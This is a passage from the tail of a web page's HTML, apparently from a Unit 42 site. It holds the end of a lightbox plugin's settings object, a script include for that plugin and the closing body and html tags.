Caption","information_panel_title_padding_left":"5","information_panel_title_padding_right":"5","information_panel_title_font_size":"15","information_panel_title_show_if_not":"true","information_panel_text_for_no_title":"No Title","information_panel_ordering":"{\"count\":[1,\"count\"],\"title\":[0,\"title\"],\"caption\":[0,\"caption\"]}"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/javascript/wpdevart_lightbox_front.js?ver=1.0'></script>
          
  </body>
</html>
